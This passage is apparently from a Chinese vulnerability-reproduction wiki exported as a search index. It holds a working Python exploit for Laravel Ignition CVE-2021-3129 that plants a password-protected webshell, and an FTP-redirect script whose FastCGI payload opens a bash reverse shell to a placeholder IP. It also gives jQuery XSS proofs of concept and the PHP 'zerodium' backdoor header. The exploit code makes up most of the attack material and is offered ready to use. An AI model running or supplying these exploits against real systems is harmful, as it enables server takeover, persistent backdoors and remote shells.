00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=53=00=6D=00=31=00=59=00=37=00=6B=00=34=00=32=00=72=00=2B=00=63=00=49=00=36=00=74=00=78=00=58=00=67=00=47=00=6A=00=36=00=46=00=66=00=4A=00=33=00=72=00=43=00=58=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def filterlog ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def phar ( url , path ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"phar://\" + path + \"\\storage \\\\ logs \\\\ laravel.log \\\\ test.txt\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def pharl ( url , path ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"phar://\" + path + \"/storage/logs/laravel.log/test.txt\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def path ( url ): req = requests . get ( url ) . text pattern = re . compile ( r '(\\#\\d*\\ (.*)(?:\\/| \\\\ )vendor)' ) m = pattern . findall ( req ) return m [ 0 ][ 1 ] if __name__ == '__main__' : print ( ''' \u2588\u2588\u2588\u2588\u2588\u2588 \u2593\u2588\u2588\u2588\u2588\u2588 \u2584\u2588\u2588\u2588\u2588\u2584 \u2588\u2588\u2593\u2588\u2588\u2588 \u2588\u2588\u2580\u2588\u2588\u2588 \u2592\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588 \u2592\u2588\u2588 \u2592 \u2593\u2588 \u2580 \u2592\u2588\u2588\u2580 \u2580\u2588 \u2593\u2588\u2588\u2591 \u2588\u2588\u2592\u2593\u2588\u2588 \u2592 \u2588\u2588\u2592\u2592\u2588\u2588\u2592 \u2588\u2588\u2592\u2592\u2588\u2588 \u2592 \u2591 \u2593\u2588\u2588\u2584 \u2592\u2588\u2588\u2588 \u2592\u2593\u2588 \u2584 \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2593\u2588\u2588 \u2591\u2584\u2588 \u2592\u2592\u2588\u2588\u2591 \u2588\u2588\u2592\u2591 \u2593\u2588\u2588\u2584 \u2592 \u2588\u2588\u2592\u2592\u2593\u2588 \u2584 \u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592\u2592\u2588\u2588\u2580\u2580\u2588\u2584 \u2592\u2588\u2588 \u2588\u2588\u2591 \u2592 \u2588\u2588\u2592 \u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2591\u2592\u2588\u2588\u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2592\u2588\u2588\u2592 \u2591 \u2591\u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592\u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592 \u2592 \u2592\u2593\u2592 \u2592 \u2591\u2591\u2591 \u2592\u2591 \u2591\u2591 \u2591\u2592 \u2592 \u2591\u2592\u2593\u2592\u2591 \u2591 \u2591\u2591 \u2592\u2593 \u2591\u2592\u2593\u2591\u2591 \u2592\u2591\u2592\u2591\u2592\u2591 \u2592 \u2592\u2593\u2592 \u2592 \u2591 \u2591 \u2591\u2592 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2592 \u2591\u2592 \u2591 \u2591\u2592 \u2591 \u2592\u2591 \u2591 \u2592 \u2592\u2591 \u2591 \u2591\u2592 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591\u2591 \u2591\u2591 \u2591 \u2591 \u2591 \u2591 \u2592 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591\u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 ''' ) url = sys . argv [ 1 ] + \"/_ignition/execute-solution\" clearlog ( url ) clearlog ( url ) clearlog ( url ) clearlog ( url ) clearlog ( url ) if ( AA ( url ) . status_code == 500 ): if ( \":\" in path ( url )): print ( \"windows\" ) if ( sendpayloadwindows ( url ) . status_code == 500 ): if ( filterlog ( url ) . status_code == 200 ): if ( phar ( url , path ( url )) . status_code == 500 ): if ( requests . get ( sys . argv [ 1 ] + \"/fuckyou.php\" ) . status_code == 200 ): print ( \"[+]webshell\u5730\u5740:\" + sys . argv [ 1 ] + \"/fuckyou.php,\u5bc6\u7801:pass\" ) else : print ( \"[-]\u6f0f\u6d1e\u4e0d\u5b58\u5728\" ) if ( \":\" not in path ( url )): print ( \"linux\" ) if ( sendpayloadlinux ( url ) . status_code == 500 ): if ( filterlog ( url ) . status_code == 200 ): if ( pharl ( url , path ( url )) . status_code == 500 ): if ( requests . get ( sys . argv [ 1 ] + \"/fuckyou.php\" ) . status_code == 200 ): print ( \"webshell\u5730\u5740:\" + sys . argv [ 1 ] + \"/fuckyou.php,\u5bc6\u7801:pass\" ) else : print ( \"[-]\u6f0f\u6d1e\u4e0d\u5b58\u5728\" ) \u6839\u636e\u8def\u5f84\u5bc6\u7801\u4f7f\u7528\u54e5\u65af\u62c9\u8fde\u63a5\u6728\u9a6c FTP\u811a\u672c # -*- coding: utf-8 -*- # @Time : 2021/1/13 6:56 \u4e0b\u5348 # @Author : tntaxin # @File : ftp_redirect.py # @Software: import socket from urllib.parse import unquote # \u5bf9gopherus\u751f\u6210\u7684payload\u8fdb\u884c\u4e00\u6b21urldecode payload = unquote ( \" %01% 01 %00% 01 %00% 08 %00% 00 %00% 01 %00% 00 %00% 00 %00% 00 %01% 04 %00% 01 %01% 07 %07% 00 %0F %10SERVER_SOFTWAREgo%20/ %20f cgiclient %20% 0B%09REMOTE_ADDR127.0.0.1 %0F %08SERVER_PROTOCOLHTTP/1.1 %0E %03CONTENT_LENGTH106 %0E %04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include %20% 3D%20On%0Adisable_functions %20% 3D %20% 0Aauto_prepend_file %20% 3D%20php%3A//input %0F %19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/ %00% 00 %00% 00 %00% 00 %00% 01 %04% 00 %01% 00 %00% 00 %00% 01 %05% 00 %01% 00j %04% 00%3C %3F php %20s ystem %28% 27bash%20-c %20% 22bash%20-i %20% 3E %26% 20/dev/tcp/xxx.xxx.xxx.xxx/9999 %200% 3E %261% 22 %27% 29%3Bdie %28% 27-----Made-by-SpyD3r-----%0A %27% 29%3B %3F%3E%00% 00 %00% 00\" ) payload = payload . encode ( 'utf-8' ) host = '0.0.0.0' port = 23 sk = socket . socket () sk . bind (( host , port )) sk . listen ( 5 ) # ftp\u88ab\u52a8\u6a21\u5f0f\u7684passvie port,\u76d1\u542c\u52301234 sk2 = socket . socket () sk2 . bind (( host , 1234 )) sk2 . listen () # \u8ba1\u6570\u5668\uff0c\u7528\u4e8e\u533a\u5206\u662f\u7b2c\u51e0\u6b21ftp\u8fde\u63a5 count = 1 while 1 : conn , address = sk . accept () conn . send ( b \"200 \\n \" ) print ( conn . recv ( 20 )) # USER aaa\\r\\n \u5ba2\u6237\u7aef\u4f20\u6765\u7528\u6237\u540d if count == 1 : conn . send ( b \"220 ready \\n \" ) else : conn . send ( b \"200 ready \\n \" ) print ( conn . recv ( 20 )) # TYPE I\\r\\n \u5ba2\u6237\u7aef\u544a\u8bc9\u670d\u52a1\u7aef\u4ee5\u4ec0\u4e48\u683c\u5f0f\u4f20\u8f93\u6570\u636e\uff0cTYPE I\u8868\u793a\u4e8c\u8fdb\u5236\uff0c TYPE A\u8868\u793a\u6587\u672c if count == 1 : conn . send ( b \"215 \\n \" ) else : conn . send ( b \"200 \\n \" ) print ( conn . recv ( 20 )) # SIZE /123\\r\\n \u5ba2\u6237\u7aef\u8be2\u95ee\u6587\u4ef6/123\u7684\u5927\u5c0f if count == 1 : conn . send ( b \"213 3 \\n \" ) else : conn . send ( b \"300 \\n \" ) print ( conn . recv ( 20 )) # EPSV\\r\\n' conn . send ( b \"200 \\n \" ) print ( conn . recv ( 20 )) # PASV\\r\\n \u5ba2\u6237\u7aef\u544a\u8bc9\u670d\u52a1\u7aef\u8fdb\u5165\u88ab\u52a8\u8fde\u63a5\u6a21\u5f0f if count == 1 : conn . send ( b \"227 127,0,0,1,4,210 \\n \" ) # \u670d\u52a1\u7aef\u544a\u8bc9\u5ba2\u6237\u7aef\u9700\u8981\u5230\u54ea\u4e2aip:port\u53bb\u83b7\u53d6\u6570\u636e,ip,port\u90fd\u662f\u7528\u9017\u53f7\u9694\u5f00\uff0c\u5176\u4e2d\u7aef\u53e3\u7684\u8ba1\u7b97\u89c4\u5219\u4e3a\uff1a4*256+210=1234 else : conn . send ( b \"227 127,0,0,1,35,40 \\n \" ) # \u7aef\u53e3\u8ba1\u7b97\u89c4\u5219\uff1a35*256+40=9000 print ( conn . recv ( 20 )) # \u7b2c\u4e00\u6b21\u8fde\u63a5\u4f1a\u6536\u5230\u547d\u4ee4RETR /123\\r\\n\uff0c\u7b2c\u4e8c\u6b21\u8fde\u63a5\u4f1a\u6536\u5230STOR /123\\r\\n if count == 1 : conn . send ( b \"125 \\n \" ) # \u544a\u8bc9\u5ba2\u6237\u7aef\u53ef\u4ee5\u5f00\u59cb\u6570\u636e\u94fe\u63a5\u4e86 # \u65b0\u5efa\u4e00\u4e2asocket\u7ed9\u670d\u52a1\u7aef\u8fd4\u56de\u6211\u4eec\u7684payload print ( \"\u5efa\u7acb\u8fde\u63a5!\" ) conn2 , address2 = sk2 . accept () conn2 . send ( payload ) conn2 . close () print ( \"\u65ad\u5f00\u8fde\u63a5!\" ) else : conn . send ( b \"150 \\n \" ) print ( conn . recv ( 20 )) exit () # \u7b2c\u4e00\u6b21\u8fde\u63a5\u662f\u4e0b\u8f7d\u6587\u4ef6\uff0c\u9700\u8981\u544a\u8bc9\u5ba2\u6237\u7aef\u4e0b\u8f7d\u5df2\u7ecf\u7ed3\u675f if count == 1 : conn . send ( b \"226 \\n \" ) conn . close () count += 1","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/#\u53c2\u8003\u6587\u7ae0","text":"\u7c73\u65af\u7279\u56e2\u961f|\u6f0f\u6d1e\u5206\u6790 | Laravel Debug\u9875\u9762RCE\uff08CVE-2021-3129\uff09\u5206\u6790\u590d\u73b0 \u964c\u964c\u5b89\u5168|FTP\u5229\u7528|LARAVEL\u7684\u90a3\u4e2aRCE\u6700\u6709\u8da3\u7684\u70b9\u5728\u8fd9\u91cc \u539f\u4f5c\u8005\u6f0f\u6d1e\u5206\u6790","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/jQuery/jQuery%20XSS%E6%BC%8F%E6%B4%9E%20CVE-2020-11022%2011023/","text":"jQuery XSS\u6f0f\u6d1e CVE-2020-11022/11023 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u636eNVD\u63cf\u8ff0\uff1a\u5728\u5927\u4e8e\u6216\u7b49\u4e8e1.2\u4e14\u57283.5.0\u4e4b\u524d\u7684jQuery\u7248\u672c\u4e2d\uff0c\u5373\u4f7f\u6267\u884c\u4e86\u6d88\u6bd2\uff08sanitize\uff09\u5904\u7406\uff0c\u4e5f\u4ecd\u4f1a\u6267\u884c\u5c06\u6765\u81ea\u4e0d\u53d7\u4fe1\u4efb\u6765\u6e90\u7684HTML\u4f20\u9012\u7ed9jQuery\u7684DOM\u64cd\u4f5c\u65b9\u6cd5\uff08\u5373html()\u3001.append()\u7b49\uff09\uff0c\u4ece\u800c\u5bfc\u81f4xss\u6f0f\u6d1e\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] 3.5.0 > jQuery >= 1.2 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5728\u7ebf\u590d\u73b0\u5730\u5740\uff0c \u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u53d8\u5316\u4e86\u89e3\u6f0f\u6d1e https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html PoC 1. < style >< style />< img src = x onerror = alert ( 1 ) > PoC 2. ( Only jQuery 3. x affected ) < img alt = \"<x\" title = \"/><img src=x onerror=alert(1)>\" > PoC 3. < option >< style ></ option ></ select >< img src = x onerror = alert ( 1 ) ></ style > PoC 1\u548cPoC 2\u5177\u6709\u76f8\u540c\u7684\u6839\u672c\u539f\u56e0\u3002\u5728\u4e2d .html() \uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7684HTML\u5b57\u7b26\u4e32\u5c06\u4f20\u9012\u5230 $ .htmlPrefilter\uff08\uff09 \u65b9\u6cd5\u3002\u8be5 htmlPrefilter \u5904\u7406\u7528\u4e8e\u66ff\u6362\u81ea\u95ed\u5408\u6807\u7b7e\u7b49\u8fdb\u884c\u5230\uff0c\u901a\u8fc7\u4f7f\u7528\u4ee5\u4e0b\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a <tagname **/>**``<tagname ></tagname> rxhtmlTag = / <\uff08?! area | br | col | embed | hr | img | input | link | meta | param\uff09\uff08\uff08[[ww\uff1a-] +\uff09[^>] *\uff09\\ /> / gi [\u3002 ..] htmlPrefilter\uff1afunction\uff08html\uff09{ return html.replace\uff08rxhtmlTag\uff0c\u201c <$ 1> </ $ 2>\u201d\uff09; } \u5982\u679cPoC 1\u7684HTML\u901a\u8fc7\u6b64\u66ff\u6362\uff0c\u5219\u8f93\u51fa\u5c06\u662f\uff1a > $ .htmlPrefilter\uff08'<style> <style /> <img src = x onerror = alert\uff081\uff09>'\uff09 <\u201c <style> <style> </ style> <img src = x onerror = alert\uff081\uff09 >\u201c \u9ec4\u8272\u90e8\u5206\u662f\u66ff\u6362\u7684\u5b57\u7b26\u4e32\u3002\u7531\u4e8e\u6b64\u66ff\u6362\uff0c <style /> \u6837\u5f0f\u5143\u7d20\u5185\u90e8\u88ab\u66ff\u6362 <style ></style> \u4e3a\uff0c\u7ed3\u679c\u662f\uff0c\u4e4b\u540e\u7684\u5b57\u7b26\u4e32\u4ece\u6837\u5f0f\u5143\u7d20\u4e2d\u88ab\u8e22\u51fa\u3002\u4e4b\u540e\uff0c .html() \u5c06\u66ff\u6362\u7684HTML\u5206\u914d\u7ed9 innerHTML \u3002\u5728\u8fd9\u91cc\uff0c <img ...> \u5b57\u7b26\u4e32\u53d8\u6210\u4e86\u5b9e\u9645\u7684img\u6807\u7b7e\uff0c\u5e76\u89e6\u53d1\u4e86onerror\u4e8b\u4ef6\u3002 \u987a\u4fbf\u8bf4\u4e00\u4e0b\uff0c\u4e0a\u8ff0\u6b63\u5219\u8868\u8fbe\u5f0f\u57283.x\u4e4b\u524d\u7684jQuery\u4e2d\u4f7f\u7528\u3002\u4ece3.x\u5f00\u59cb\uff0c\u4f7f\u7528\u4e86\u53e6\u4e00\u4e2a\u7ecf\u8fc7\u7a0d\u52a0\u4fee\u6539\u7684\u6b63\u5219\u8868\u8fbe\u5f0f rxhtmlTag = / <\uff08?! area | br | col | embed | hr | img | input | link | meta | param\uff09\uff08\uff08[[az] [^ \\ / \\ 0> \\ x20 \\ t \\ r \\ n \\ f] *\uff09[^>] *\uff09\\ /> / gi \u6b64\u66f4\u6539\u5f15\u5165\u4e86\u53e6\u4e00\u4e2aXSS\u5411\u91cf\uff0c\u8be5\u5411\u91cf\u53ef\u80fd\u4ec5\u7531\u66f4\u591a\u57fa\u672c\u5143\u7d20\u548c\u5c5e\u6027\u5bfc\u81f4XSS\u3002\u901a\u8fc7\u6b64\u66f4\u6539\u5f15\u5165\u4e86PoC 2\u7684\u5411\u91cf\u3002\u5b83\u4ec5\u9002\u7528\u4e8ejQuery3.x\u3002 > $ .htmlPrefilter\uff08'<img alt =\u201c <x\u201d title =\u201c /> <img src = x onerror = alert\uff081\uff09>\u201d>'\uff09 <\u201c <img alt =\u201d <x\u201c title =\u201d> < / x\u201c> <img src = x onerror = alert\uff081\uff09>\u201d>\u201c \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c5e\u6027\u503c\u4e0a\u7684 img \u5b57\u7b26\u4e32\u88ab\u8e22\u51fa\u5e76\u53d1\u751fXSS\u3002","title":"jQuery XSS\u6f0f\u6d1e CVE-2020-11022 11023"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/jQuery/jQuery%20XSS%E6%BC%8F%E6%B4%9E%20CVE-2020-11022%2011023/#jquery-xss\u6f0f\u6d1e-cve-2020-1102211023","text":"","title":"jQuery XSS\u6f0f\u6d1e CVE-2020-11022/11023"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/jQuery/jQuery%20XSS%E6%BC%8F%E6%B4%9E%20CVE-2020-11022%2011023/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u636eNVD\u63cf\u8ff0\uff1a\u5728\u5927\u4e8e\u6216\u7b49\u4e8e1.2\u4e14\u57283.5.0\u4e4b\u524d\u7684jQuery\u7248\u672c\u4e2d\uff0c\u5373\u4f7f\u6267\u884c\u4e86\u6d88\u6bd2\uff08sanitize\uff09\u5904\u7406\uff0c\u4e5f\u4ecd\u4f1a\u6267\u884c\u5c06\u6765\u81ea\u4e0d\u53d7\u4fe1\u4efb\u6765\u6e90\u7684HTML\u4f20\u9012\u7ed9jQuery\u7684DOM\u64cd\u4f5c\u65b9\u6cd5\uff08\u5373html()\u3001.append()\u7b49\uff09\uff0c\u4ece\u800c\u5bfc\u81f4xss\u6f0f\u6d1e\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/jQuery/jQuery%20XSS%E6%BC%8F%E6%B4%9E%20CVE-2020-11022%2011023/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] 3.5.0 > jQuery >= 1.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/jQuery/jQuery%20XSS%E6%BC%8F%E6%B4%9E%20CVE-2020-11022%2011023/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5728\u7ebf\u590d\u73b0\u5730\u5740\uff0c \u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u53d8\u5316\u4e86\u89e3\u6f0f\u6d1e https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html PoC 1. < style >< style />< img src = x onerror = alert ( 1 ) > PoC 2. ( Only jQuery 3. x affected ) < img alt = \"<x\" title = \"/><img src=x onerror=alert(1)>\" > PoC 3. < option >< style ></ option ></ select >< img src = x onerror = alert ( 1 ) ></ style > PoC 1\u548cPoC 2\u5177\u6709\u76f8\u540c\u7684\u6839\u672c\u539f\u56e0\u3002\u5728\u4e2d .html() \uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7684HTML\u5b57\u7b26\u4e32\u5c06\u4f20\u9012\u5230 $ .htmlPrefilter\uff08\uff09 \u65b9\u6cd5\u3002\u8be5 htmlPrefilter \u5904\u7406\u7528\u4e8e\u66ff\u6362\u81ea\u95ed\u5408\u6807\u7b7e\u7b49\u8fdb\u884c\u5230\uff0c\u901a\u8fc7\u4f7f\u7528\u4ee5\u4e0b\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a <tagname **/>**``<tagname ></tagname> rxhtmlTag = / <\uff08?! area | br | col | embed | hr | img | input | link | meta | param\uff09\uff08\uff08[[ww\uff1a-] +\uff09[^>] *\uff09\\ /> / gi [\u3002 ..] htmlPrefilter\uff1afunction\uff08html\uff09{ return html.replace\uff08rxhtmlTag\uff0c\u201c <$ 1> </ $ 2>\u201d\uff09; } \u5982\u679cPoC 1\u7684HTML\u901a\u8fc7\u6b64\u66ff\u6362\uff0c\u5219\u8f93\u51fa\u5c06\u662f\uff1a > $ .htmlPrefilter\uff08'<style> <style /> <img src = x onerror = alert\uff081\uff09>'\uff09 <\u201c <style> <style> </ style> <img src = x onerror = alert\uff081\uff09 >\u201c \u9ec4\u8272\u90e8\u5206\u662f\u66ff\u6362\u7684\u5b57\u7b26\u4e32\u3002\u7531\u4e8e\u6b64\u66ff\u6362\uff0c <style /> \u6837\u5f0f\u5143\u7d20\u5185\u90e8\u88ab\u66ff\u6362 <style ></style> \u4e3a\uff0c\u7ed3\u679c\u662f\uff0c\u4e4b\u540e\u7684\u5b57\u7b26\u4e32\u4ece\u6837\u5f0f\u5143\u7d20\u4e2d\u88ab\u8e22\u51fa\u3002\u4e4b\u540e\uff0c .html() \u5c06\u66ff\u6362\u7684HTML\u5206\u914d\u7ed9 innerHTML \u3002\u5728\u8fd9\u91cc\uff0c <img ...> \u5b57\u7b26\u4e32\u53d8\u6210\u4e86\u5b9e\u9645\u7684img\u6807\u7b7e\uff0c\u5e76\u89e6\u53d1\u4e86onerror\u4e8b\u4ef6\u3002 \u987a\u4fbf\u8bf4\u4e00\u4e0b\uff0c\u4e0a\u8ff0\u6b63\u5219\u8868\u8fbe\u5f0f\u57283.x\u4e4b\u524d\u7684jQuery\u4e2d\u4f7f\u7528\u3002\u4ece3.x\u5f00\u59cb\uff0c\u4f7f\u7528\u4e86\u53e6\u4e00\u4e2a\u7ecf\u8fc7\u7a0d\u52a0\u4fee\u6539\u7684\u6b63\u5219\u8868\u8fbe\u5f0f rxhtmlTag = / <\uff08?! area | br | col | embed | hr | img | input | link | meta | param\uff09\uff08\uff08[[az] [^ \\ / \\ 0> \\ x20 \\ t \\ r \\ n \\ f] *\uff09[^>] *\uff09\\ /> / gi \u6b64\u66f4\u6539\u5f15\u5165\u4e86\u53e6\u4e00\u4e2aXSS\u5411\u91cf\uff0c\u8be5\u5411\u91cf\u53ef\u80fd\u4ec5\u7531\u66f4\u591a\u57fa\u672c\u5143\u7d20\u548c\u5c5e\u6027\u5bfc\u81f4XSS\u3002\u901a\u8fc7\u6b64\u66f4\u6539\u5f15\u5165\u4e86PoC 2\u7684\u5411\u91cf\u3002\u5b83\u4ec5\u9002\u7528\u4e8ejQuery3.x\u3002 > $ .htmlPrefilter\uff08'<img alt =\u201c <x\u201d title =\u201c /> <img src = x onerror = alert\uff081\uff09>\u201d>'\uff09 <\u201c <img alt =\u201d <x\u201c title =\u201d> < / x\u201c> <img src = x onerror = alert\uff081\uff09>\u201d>\u201c \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c5e\u6027\u503c\u4e0a\u7684 img \u5b57\u7b26\u4e32\u88ab\u8e22\u51fa\u5e76\u53d1\u751fXSS\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/","text":"PHP zerodium\u540e\u95e8\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 PHP\u5f00\u53d1\u5de5\u7a0b\u5e08Jake Birchall\u5728\u5bf9\u5176\u4e2d\u4e00\u4e2a\u6076\u610fCOMMIT\u7684\u5206\u6790\u8fc7\u7a0b\u4e2d\u53d1\u73b0\uff0c\u5728\u4ee3\u7801\u4e2d\u6ce8\u5165\u7684\u540e\u95e8\u662f\u6765\u81ea\u4e00\u4e2aPHP\u4ee3\u7801\u88ab\u52ab\u6301\u7684\u7f51\u7ad9\u4e0a\uff0c\u5e76\u4e14\u91c7\u7528\u4e86\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u64cd\u4f5c\uff0c\u5e76\u4e14\u653b\u51fb\u8005\u76d7\u7528\u4e86PHP\u5f00\u53d1\u4eba\u5458\u7684\u540d\u4e49\u6765\u63d0\u4ea4\u6b64COMMIT\u3002 \u76ee\u524d\u4e3a\u6b62PHP\u5b98\u65b9\u5e76\u672a\u5c31\u8be5\u4e8b\u4ef6\u8fdb\u884c\u66f4\u591a\u62ab\u9732\uff0c\u8868\u793a\u6b64\u6b21\u670d\u52a1\u5668\u88ab\u9ed1\u7684\u5177\u4f53\u7ec6\u8282\u4ecd\u5728\u8c03\u67e5\u5f53\u4e2d\u3002\u7531\u4e8e\u6b64\u4e8b\u4ef6\u7684\u5f71\u54cd\uff0cPHP\u7684\u5b98\u65b9\u4ee3\u7801\u5e93\u5df2\u7ecf\u88ab\u7ef4\u62a4\u4eba\u5458\u8fc1\u79fb\u81f3GitHub\u5e73\u53f0\uff0c\u4e4b\u540e\u7684\u76f8\u5173\u4ee3\u7801\u66f4\u65b0\u3001\u4fee\u6539\u5c06\u4f1a\u90fd\u5728GitHub\u4e0a\u8fdb\u884c\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] PHP 8.1.0-dev FOFA \u00b6 [!NOTE] \"PHP/8.1.0-dev\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u540e\u95e8\u4e3a\u6dfb\u52a0\u8bf7\u6c42\u5934 User-Agentt: zerodiumsystem('id'); [!NOTE] \u662f User-Agentt \u4e0d\u662f User-Agent \u53cd\u5f39shell","title":"PHP zerodium\u540e\u95e8\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/#php-zerodium\u540e\u95e8\u6f0f\u6d1e","text":"","title":"PHP zerodium\u540e\u95e8\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"PHP\u5f00\u53d1\u5de5\u7a0b\u5e08Jake Birchall\u5728\u5bf9\u5176\u4e2d\u4e00\u4e2a\u6076\u610fCOMMIT\u7684\u5206\u6790\u8fc7\u7a0b\u4e2d\u53d1\u73b0\uff0c\u5728\u4ee3\u7801\u4e2d\u6ce8\u5165\u7684\u540e\u95e8\u662f\u6765\u81ea\u4e00\u4e2aPHP\u4ee3\u7801\u88ab\u52ab\u6301\u7684\u7f51\u7ad9\u4e0a\uff0c\u5e76\u4e14\u91c7\u7528\u4e86\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u64cd\u4f5c\uff0c\u5e76\u4e14\u653b\u51fb\u8005\u76d7\u7528\u4e86PHP\u5f00\u53d1\u4eba\u5458\u7684\u540d\u4e49\u6765\u63d0\u4ea4\u6b64COMMIT\u3002 